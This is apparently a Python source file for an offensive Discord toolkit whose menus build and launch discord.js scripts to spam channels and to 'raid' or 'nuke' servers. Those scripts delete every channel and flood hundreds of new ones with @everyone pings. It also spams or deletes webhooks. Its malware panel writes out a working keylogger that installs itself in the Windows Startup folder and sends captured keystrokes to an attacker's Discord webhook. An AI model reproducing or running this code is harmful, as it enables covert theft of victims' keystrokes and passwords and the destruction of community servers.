
import os
try:
    import dhooks
except:
    os.system("pip install dhooks")
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
try:
    import discord
except:
    os.system("pip install discord")
from time import sleep

def yesNo(msg):
    y_or_n = input(msg)
    if y_or_n != "y":
        return False
    else:
        return True



def space(nmbr):
    space = ""
    for i in range(nmbr):
        space = space + " "
    return space




def clear():
  os.system("cls")


#spammerbot
def botspammer():
    token = input("The token of an Administrator bot : ")
    serverid = input("Server ID : ")
    channelid = input("Channel ID : ")
    message = input("Message : ")
    howmany = input("How many spam : ")
    content = """const Discord = require("discord.js")
const Client = new Discord.Client


Client.on("ready", async () =>{
    let guild = Client.guilds.cache.get("serverid")
    let channel = guild.channels.cache.get("channelid")
    let message = "msg"
    for(r = 0; r != howmany; r++){
        channel.send(message)
    }
})

Client.login("token")

"""
    content = str.replace(content, "token", token)
    content = str.replace(content, "serverid", serverid)
    content = str.replace(content, "channelid", channelid)
    content = str.replace(content, "howmany", howmany)
    content = str.replace(content, "msg", message)
    file = open("Spam.js", "w")
    file.write(content)
    file.close()
    os.startfile("Spam.js")
    sleep(0.5)
    os.remove("Spam.js")
    clear()
    mainpanel()


#raid bot
def raid():
  token = input("The token of an Administrator bot : ")
  serverid = input("Server ID : ")
  message = input("Message : ")
  content = """const Discord = require("discord.js")
const Client = new Discord.Client

Client.on("ready", async () =>{
    let guild = Client.guilds.cache.get("serverid")
    let themessage = "msg"
    guild.setName(themessage)

    guild.fetch(guild)
    guild.channels.cache.map(channel => channel.delete())

    for(let count = 0; count != 500; count++){
    let channel = guild.channels.create(themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    }
})

Client.login("token")

"""
  content = str.replace(content, "token", token)
  content = str.replace(content, "serverid", serverid)
  content = str.replace(content, "msg", message)
  file = open("Raid.js", "w")
  file.write(content)
  file.close()
  os.startfile("Raid.js")
  sleep(0.5)
  os.remove("Raid.js")
  clear()
  mainpanel()



#nuke bot
def botnuke():
    token = input("The token of an Administrator bot : ")
    message = input("Message : ")
    content = """const Discord = require("discord.js")
const Client = new Discord.Client

Client.on("ready", async () =>{
    Client.guilds.fetch(Client.guilds)
    for(let r = 0; r < Client.guilds.cache.map(guild => guild).length; r++){
    let guild = Client.guilds.cache.map(guild => guild)[0]
    let themessage = "msg"
    guild.fetch(guild)
    guild.channels.cache.map(channel => channel.delete())

    for(let count = 0; count != 500; count++){
    let channel = guild.channels.create(themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    }
}
})

Client.login("token")

"""
    content = str.replace(content, "token", token)
    content = str.replace(content, "msg", message)
    file = open("Nuke.js", "w")
    file.write(content)
    file.close()
    os.startfile("Nuke.js")
    sleep(0.5)
    os.remove("Nuke.js")
    clear()
    mainpanel()


#webhook spam
def webhookspam():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")
    howmany = int(input("How many spam : "))
    delay = int(input("Delay (ms) : "))
            

    for i in range(howmany):
        if file != "":
            try:
                fichier_send = dhooks.File(file)
                webhook.send(content=message, file=fichier_send)
            except:
                print("File doesn't exist.")
                webhookspam()
        else:
            webhook.send(message)
        sleep(delay/1000)
        print(f"Spam N°{i} sent")
        clear()
        mainpanel()


#webhooks infos
def webhookinfos():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
    print(f"""
    Url : {webhooklink}
    Name : {webhook.get_info().default_name}
    Avatar : {webhook.get_info().default_avatar_url}
    Server ID : {webhook.get_info().guild_id}
    Channel ID : {webhook.get_info().channel_id}""")
    input("Press enter to finish...")
    clear()
    mainpanel()


#delete webhook
def webhookdelete():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
        webhookdelete()
    try:
        webhook.delete()
    except:
        pass
    clear()
    mainpanel()



def webhookmessage():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")  
    if file != "":
        try:
            fichier_send = dhooks.File(file)
            webhook.send(content=message, file=fichier_send)
        except:
            print("File doesn't exist.")
            webhookspam()
    else:
        webhook.send(message)
        clear()
        mainpanel()


#get keylogger file
def keyloggerconfig():
  name = input("Name of the file : ")
  webhooklink = input("Your Webhook Url : ")
  content = """import os
from time import sleep
try:
    from pynput import mouse, keyboard
    from dhooks import *
except:
    os.system("pip install pynput")
    sleep(2)
    os.system("pip install dhooks")
    sleep(2)
import shutil
from os import read, remove, getenv
from os.path import isfile
from threading import Thread
from datetime import *

strlien = "Your Webhooks url"

while True:
    try:
        lien = Webhook(strlien)
        keys = {}

        fichier = f"C:/Users/{getenv('username')}/keys.txt"

        target = f"C:/Users/{getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

        if target != __file__:
            shutil.copy(__file__, target)
            remove(__file__)


        if isfile(fichier):
            try:
                remove(fichier)
            except:
                pass

        def envoi_fichier():
            while True:
                if isfile(fichier):
                    sleep(15)
                    fichier_send = File(fichier)
                    lien.send(file=fichier_send)
                    try:
                        remove(fichier)
                    except:
                        pass





        for i in range(11):
            keys["<" + str(i + 96) + ">"] = str(i)


        def on_press(key):
            key = str(key)

            if key in keys:
                key = keys[key]

            if key[0] == "'" and key[2] == "'":
                key = key[1]

            if key == "Key.ctrl_l":
                key = "ctrl"

            if key == "Key.caps_lock":
                key = "maj_lock"

            if key == "Key.shift":
                key = "shift"

            if key == "Key.enter":
                key = "enter"

            if key == "Key.space":
                key = "space"

            if key == "Key.backspace":
                key = "delete"

            if key == str(r"'\x03'"):
                key = "ctrl_c"

            if key == str(r"'\x16'"):
                key = "ctrl_v"

            if key == str(r"'\x13'"):
                key = "ctrl_s"

            if key == str(r"'\x06'"):
                key = "ctrl_f"

            if key == str(r"'\x08'"):
                key = "ctrl_h"

            if key in keys:
                key = keys[key]

            with open(fichier, 'a') as f:
                f.write(key + "      " +str(datetime.now().time()) + "\\n")
                f.close()

        Thread(target=envoi_fichier).start()


        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass
    sleep(2)
"""
  content = str.replace(content, "Your Webhook url", webhooklink)
  file = open(name+".pyw", "w")
  file.write(content)
  file.close()
  print("Done !")
  input("Press enter to finish...")
  clear()
  mainpanel()



def malwarepanel():
    print(f"""{Fore.MAGENTA}

    ...     ..      ..                       ..                                                        
  x*8888x.:*8888: -"888:               x .d88"    x=~                                                  
 X   48888X `8888H  8888                5888R    88x.   .e.   .e.                 .u    .              
X8x.  8888X  8888X  !888>        u      '888R   '8888X.x888:.x888        u      .d88B :@8c       .u    
X8888 X8888  88888   "*8%-    us888u.    888R    `8888  888X '888k    us888u.  ="8888f8888r   ud8888.  
'*888!X8888> X8888  xH8>   .@88 "8888"   888R     X888  888X  888X .@88 "8888"   4888>'88"  :888'8888. 
  `?8 `8888  X888X X888>   9888  9888    888R     X888  888X  888X 9888  9888    4888> '    d888 '88%" 
  -^  '888"  X888  8888>   9888  9888    888R     X888  888X  888X 9888  9888    4888>      8888.+"    
   dx '88~x. !88~  8888>   9888  9888    888R    .X888  888X. 888~ 9888  9888   .d888L .+   8888L      
 .8888Xf.888x:!    X888X.: 9888  9888   .888B .  `%88%``"*888Y"    9888  9888   ^"8888*"    '8888c. .+ 
:""888":~"888"     `888*"  "888*""888"  ^*888%     `~     `"       "888*""888"     "Y"       "88888%   
    "~'    "~        ""     ^Y"   ^Y'     "%                        ^Y"   ^Y'                  "YP'    

                         {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Keylogger                                                                              
                                                                                                       

                        EXIT to return to the main panel                                                                       
""")
    malwaremode = input(space(50)+"Mode = "+Fore.RESET)
    if malwaremode == "1":
        clear()
        keyloggerconfig()
        exit()
    if malwaremode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    malwarepanel()



def botpanel():
    print(f"""{Fore.MAGENTA}

     ...     ..                       s    
  .=*8888x <"?88h.                   :8    
 X>  '8888H> '8888          u.      .88    
'88h. `8888   8888    ...ue888b    :888ooo 
'8888 '8888    "88>   888R Y888r -*8888888 
 `888 '8888.xH888x.   888R I888>   8888    
   X" :88*~  `*8888>  888R I888>   8888    
 ~"   !"`      "888>  888R I888>   8888    
  .H8888h.      ?88  u8888cJ888   .8888Lu= 
 :"^"88888h.    '!    "*888*P"    ^%888*   
 ^    "88888hx.+"       'Y"         'Y"    
        ^"**""                             
                                           
               {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Spam

               {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Raid

               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Nuke    

                
                EXIT to return to the main panel
""")

    botmode = input(space(50)+"Mode = "+Fore.RESET)
    if botmode == "1":
        clear()
        botspammer()
        exit()
    if botmode == "2":
        clear()
        raid()
        exit()
    if botmode == "3":
        clear()
        botnuke()
        exit()
    if botmode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    botpanel()



def webhookpanel():
    print(f"""{Fore.MAGENTA}

     ...    .     ...                       ..                                              ..         .x+=:.   
  .~`"888x.!**h.-``888h.              . uW8"        .uef^"                            < .z@8"`        z`    ^%  
 dX   `8888   :X   48888>             `t888       :d88E              u.          u.    !@88E             .   <k 
'888x  8888  X88.  '8888>       .u     8888   .   `888E        ...ue888b   ...ue888b   '888E   u       .@8Ned8" 
'88888 8888X:8888:   )?""`   ud8888.   9888.z88N   888E .z8k   888R Y888r  888R Y888r   888E u@8NL   .@^%8888"  
 `8888>8888 '88888>.88h.   :888'8888.  9888  888E  888E~?888L  888R I888>  888R I888>   888E`"88*"  x88:  `)8b. 
   `8" 888f  `8888>X88888. d888 '88%"  9888  888E  888E  888E  888R I888>  888R I888>   888E .dN.   8888N=*8888 
  -~` '8%"     88" `88888X 8888.+"     9888  888E  888E  888E  888R I888>  888R I888>   888E~8888    %8"    R88 
  .H888n.      XHn.  `*88! 8888L       9888  888E  888E  888E u8888cJ888  u8888cJ888    888E '888&    @8Wou 9%  
 :88888888x..x88888X.  `!  '8888c. .+ .8888  888"  888E  888E  "*888*P"    "*888*P"     888E  9888. .888888P`   
 f  ^%888888% `*88888nx"    "88888%    `%888*%"   m888N= 888>    'Y"         'Y"      '"888*" 4888" `   ^"F     
      `"**"`    `"**""        "YP'        "`       `Y"   888                             ""    ""               
                                                        J88"                                                    
                                                        @%                                                      
                                                      :"         

                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Spam

                {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Infos

                {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Delete

                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Send message


                EXIT to return to the main panel

""")
    webhookmode = input(space(50)+"Mode = "+Fore.RESET)
    if webhookmode == "1":
        clear()
        webhookspam()
        exit()
    if webhookmode == "2":
        clear()
        webhookinfos()
        exit()
    if webhookmode == "3":
        clear()
        webhookdelete()
        exit()
    if webhookmode == "4":
        clear()
        webhookmessage()
        exit()
    if webhookmode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    webhookpanel()



def mainpanel():
    print(f"""{Fore.MAGENTA}

    .....                                          ..                                
 .H8888888h.  ~-.                                dF                                  
 888888888888x  `>    x.    .        u.    u.   '88bu.         .u    .               
X~     `?888888hx~  .@88k  z88u    x@88k u@88c. '*88888bu    .d88B :@8c        u     
'      x8.^"*88*"  ~"8888 ^8888   ^"8888""8888"   ^"*8888N  ="8888f8888r    us888u.  
 `-:- X8888x         8888  888R     8888  888R   beWE "888L   4888>'88"  .@88 "8888" 
      488888>        8888  888R     8888  888R   888E  888E   4888> '    9888  9888  
    .. `"88*         8888  888R     8888  888R   888E  888E   4888>      9888  9888  
  x88888nX"      .   8888 ,888B .   8888  888R   888E  888F  .d888L .+   9888  9888  
 !"*8888888n..  :   "8888Y 8888"   "*88*" 8888" .888N..888   ^"8888*"    9888  9888  
'    "*88888888*     `Y"   'YP       ""   'Y"    `"888*""       "Y"      "888*""888" 
        ^"***"`                                     ""                    ^Y"   ^Y'  
                                                                                     
               {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Webhook

               {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Bot

               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Malware                                                                      
                                                                                     
""")
    mainmode = input(space(50)+"Mode = "+Fore.RESET)
    if mainmode == "1":
        clear()
        webhookpanel()
        exit()
    if mainmode == "2":
        if yesNo("WARNING ! You must have NodeJs to continue. Continue? (y/n)"):
            clear()
            botpanel()
            exit()
        else:
            clear()
            mainpanel()
            exit()
    if mainmode == "3":
        clear()
        malwarepanel()
        exit()
    clear()
    mainpanel()    
        



clear()
mainpanel()